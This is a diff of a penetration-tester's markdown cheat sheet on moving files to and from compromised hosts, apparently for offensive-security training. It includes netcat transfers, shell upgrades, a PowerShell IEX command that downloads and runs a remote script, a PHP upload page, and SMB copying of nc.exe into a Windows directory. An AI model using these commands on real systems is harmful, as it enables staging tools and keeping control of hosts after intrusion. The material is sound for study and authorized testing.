@@ -1,27 +1,33 @@
-
-
-    pure-ftpd
-        install pure ftpd
-            1.configure setup-ftpd.sh
-                #!/bin/bash
-                sudo groupadd ftpgroup
-                sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-                sudo pure-pw useradd offsec -u ftpuser -d /ftphome
-                sudo pure-pw mkdb
-                cd /etc/pure-ftpd/auth
-                sudo ln -s ../conf/PureDB 60pdb
-                sudo mkdir -p /ftphome
-                sudo chown -R ftpuser:ftpgroup /ftphome/
-                sudo systemctl restart pure-ftpd
-            2.chmod +x 
-            3  ./setup-ftpd.sh
-            4 systemctl restart pure-ftpd.ser
-
-    # when get a inactive shell
-        # to get a better shell
+#### nc
+```
+//on receiver
+nc -nvlp $port > xx.file
+//on sender
+nc rhost rport < xx.file
+```
+#### FTP pure-ftpd
+```
+install pure ftpd
+    1.configure setup-ftpd.sh
+        #!/bin/bash
+        sudo groupadd ftpgroup
+        sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+        sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+        sudo pure-pw mkdb
+        cd /etc/pure-ftpd/auth
+        sudo ln -s ../conf/PureDB 60pdb
+        sudo mkdir -p /ftphome
+        sudo chown -R ftpuser:ftpgroup /ftphome/
+        sudo systemctl restart pure-ftpd
+    2.chmod +x 
+    3  ./setup-ftpd.sh
+    4 systemctl restart pure-ftpd.ser
+```
+#### when get a inactive shell
+        - to get a better shell
         python3 -c "import pty; pty.spawn ('/bin/bash')"  
 
-        # to get a interactive shell, after line 21
+        - to get a interactive shell, after line 21
             ctrl + z
                 stty raw -echo
             fg # back to formal command line
@@ -30,7 +36,7 @@
             export TRRM=screen
             stty rows 50 columns 120
             reset 
-    # win7 and later win, powershell download file
+    - win7 and later win, powershell download file
         powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')
 
         powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://IP/xxx.ps1')
@@ -46,6 +52,8 @@
         # then on the source host,,  
             ftp -v -n -s:ftp.txt  #-s set the file to run
 *************************************************************************************
+#### PHP upload server
+```
     # create a php upload page on the target host to tranfer file
     # upload.php
 <?php
@@ -76,22 +84,23 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
 </form>
 </body>
 </html>
-
+```
     # on win to upload file
-        powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.0.102/upload.php','nc.exe')
+       ` powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.0.102/upload.php','nc.exe')`
     # on linux
-        curl -X POST -F "file=@xxx.txt" http://192.168.0.102/upload.php
+        `curl -X POST -F "file=@xxx.txt" http://192.168.0.102/upload.php`
 
 *************************************************************************************
-# LINUX remote desk to win  ,, disable network auth
-rdesktop -u ed 192.168.0.104 -p 12q -g 1200x900 -x -x80  -r sound:local -r disk:netdisk=/home/kali/
+#### LINUX remote desk to win  ,, disable network auth
+`rdesktop -u ed 192.168.0.104 -p 12q -g 1200x900 -x -x80  -r sound:local -r disk:netdisk=/home/kali/`
 
-# no need to disable net auth
-xfreerdp /u:ed /p:12q /v:192.168.0.104 /w:1200 /h:900 /drive:home,/home/kali 
+#### no need to disable net auth
+`xfreerdp /u:ed /p:12q /v:192.168.0.104 /w:1200 /h:900 /drive:home,/home/kali `
 
 #### smbserver
-    impacket-smbserver share . -smb2support
+    `impacket-smbserver share . -smb2support`
 
-//on win
+```on win
     net use \\10.10.16.3\   or net use \\10.10.16.3\share 
     copy \\10.10.16.3\share\nc64.exe \programdata\nc.exe
+```
